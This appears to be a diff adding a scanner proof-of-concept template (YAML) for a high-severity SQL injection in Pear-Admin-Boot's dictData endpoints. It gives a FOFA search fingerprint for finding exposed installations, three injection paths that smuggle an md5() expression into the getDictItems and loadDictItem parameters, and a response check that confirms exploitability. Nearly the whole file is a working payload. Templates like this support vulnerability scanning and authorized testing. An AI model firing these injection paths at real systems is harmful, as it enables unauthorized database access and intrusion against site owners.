@@ -1,0 +1,24 @@
+id: poc-yaml-pear-admin-boot-dictdata-sqli
+info:
+  name: Pear-Admin-Boot dictData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: pear-admin-boot
+  fofa: body="明 湖 区 最 具 影 响 力 的 设 计 规 范 之 一"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  path: '"system/dictData/getDictItems/gen_table,md5("+str(t1)+"),1,1"
+
+    "system/dictData/getDictItems/sys_user,md5("+str(t1)+"),1"
+
+    "system/dictData/loadDictItem/sys_user,md5("+str(t1)+"),1?key=1"
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: status_code == 200 && contains(body,t2) && contains(body,"\"dataLabel\":")
+    && contains(body,"\"success\":true")
+transport: http
